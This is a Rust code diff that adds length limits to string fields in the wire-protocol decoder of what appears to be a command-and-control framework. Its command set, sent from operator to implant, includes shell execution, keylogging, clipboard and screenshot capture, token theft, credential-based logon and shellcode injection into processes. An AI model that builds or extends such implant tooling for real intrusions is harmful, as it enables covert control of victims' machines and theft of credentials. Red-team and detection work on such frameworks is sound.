@@ -40,6 +40,14 @@ fn checked_count(r: &mut Reader, declared: u32) -> Result<usize, WireError> {
     Ok((declared as usize).min(r.remaining()))
 }
 
+fn checked_str(r: &mut Reader, max_len: usize) -> Result<String, WireError> {
+    let b = r.blob()?;
+    if b.len() > max_len {
+        return Err(WireError::BadLen(b.len()));
+    }
+    String::from_utf8(b.to_vec()).map_err(|_| WireError::Utf8)
+}
+
 /// Initial check-in metadata an implant sends on first contact.
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub struct SessionInfo {
@@ -69,9 +77,9 @@ impl SessionInfo {
     pub fn decode(r: &mut Reader) -> Result<Self, WireError> {
         Ok(Self {
             beacon_id: r.u32()?,
-            hostname: r.str()?,
-            username: r.str()?,
-            os: r.str()?,
+            hostname: checked_str(r, 256)?,
+            username: checked_str(r, 256)?,
+            os: checked_str(r, 256)?,
             arch: r.u8()?,
             pid: r.u32()?,
             is_admin: r.u8()?,
@@ -405,52 +413,52 @@ impl Command {
                 seconds: r.u32()?,
                 jitter_pct: r.u8()?,
             },
-            3 => Command::Shell { args: r.str()? },
+            3 => Command::Shell { args: checked_str(r, 65536)? },
             4 => Command::Upload {
-                name: r.str()?,
+                name: checked_str(r, 4096)?,
                 data: r.blob()?.to_vec(),
             },
-            5 => Command::Download { path: r.str()? },
+            5 => Command::Download { path: checked_str(r, 4096)? },
             6 => Command::Exit,
             7 => {
-                let name = r.str()?;
+                let name = checked_str(r, 256)?;
                 let n_raw = r.u32()?;
                 let cap = checked_count(r, n_raw)?;
                 let n = (n_raw as usize).min(MAX_WIRE_COUNT);
                 let mut args = Vec::with_capacity(cap);
                 for _ in 0..n {
-                    args.push(r.str()?);
+                    args.push(checked_str(r, 8192)?);
                 }
                 let blob = r.blob()?.to_vec();
                 Command::Bof { name, args, blob }
             }
             8 => Command::Connect {
                 proto: r.u8()?,
-                host: r.str()?,
+                host: checked_str(r, 512)?,
                 port: r.u16()?,
                 chan: r.u32()?,
             },
             9 => Command::Socks {
                 chan: r.u32()?,
                 op: r.u8()?,
-                addr: r.str()?,
+                addr: checked_str(r, 512)?,
                 port: r.u16()?,
             },
             10 => {
                 let op = FileOp::decode(r)?;
-                let path = r.str()?;
-                let dest = if r.u8()? == 1 { Some(r.str()?) } else { None };
+                let path = checked_str(r, 4096)?;
+                let dest = if r.u8()? == 1 { Some(checked_str(r, 4096)?) } else { None };
                 Command::FileOp { op, path, dest }
             }
             11 => Command::Screenshot { monitor: r.u8()? },
             12 => Command::Portscan {
-                host: r.str()?,
-                ports: r.str()?,
+                host: checked_str(r, 512)?,
+                ports: checked_str(r, 512)?,
             },
-            13 => Command::Net { query: r.str()? },
+            13 => Command::Net { query: checked_str(r, 512)? },
             14 => Command::DriveInfo,
             15 => Command::Clipboard,
-            16 => Command::Env { name: r.str()? },
+            16 => Command::Env { name: checked_str(r, 256)? },
             17 => Command::Keylog { action: r.u8()? },
             18 => Command::Screenwatch {
                 interval_secs: r.u32()?,
@@ -463,9 +471,9 @@ impl Command {
             21 => Command::ChannelClose { chan: r.u32()? },
             22 => Command::StealToken { pid: r.u32()? },
             23 => Command::MakeToken {
-                domain: r.str()?,
-                user: r.str()?,
-                password: r.str()?,
+                domain: checked_str(r, 256)?,
+                user: checked_str(r, 256)?,
+                password: checked_str(r, 256)?,
                 logon_type: r.u8()?,
             },
             24 => Command::Rev2Self,
@@ -473,7 +481,7 @@ impl Command {
             26 => {
                 let method = r.u8()?;
                 let pid = r.u32()?;
-                let spawn_to = r.str()?;
+                let spawn_to = checked_str(r, 4096)?;
                 let shellcode = r.blob()?.to_vec();
                 Command::Inject {
                     method,
@@ -561,9 +569,9 @@ impl Response {
         Ok(match r.u8()? {
             1 => Response::Output(r.blob()?.to_vec()),
             2 => Response::Ok,
-            3 => Response::Err(r.str()?),
+            3 => Response::Err(checked_str(r, 4096)?),
             4 => {
-                let name = r.str()?;
+                let name = checked_str(r, 4096)?;
                 let seq = r.u32()?;
                 let eof_raw = r.u8()?;
                 if eof_raw > 1 {
